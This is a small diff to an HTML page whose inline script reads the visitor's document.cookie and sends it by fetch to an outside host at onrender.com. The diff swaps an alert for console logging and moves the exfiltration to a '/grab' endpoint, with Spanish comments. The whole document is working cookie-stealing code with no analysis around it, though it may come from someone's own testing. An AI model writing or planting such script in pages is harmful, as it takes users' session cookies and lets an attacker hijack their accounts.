@@ -8,10 +8,10 @@
 <body>
     <script>
         const cookies = document.cookie;
-        alert("Cookies obtenidas: " + cookies);
+        console.log("Cookies capturadas:", cookies);
 
-
-        fetch(`https://testnode-knt5.onrender.com/cookies?cookies=${cookies}`, { 
+        // Envía las cookies al servidor usando el endpoint /grab
+        fetch(`https://testnode-knt5.onrender.com/grab?data=${cookies}`, { 
             method: 'GET',
         })
     </script>
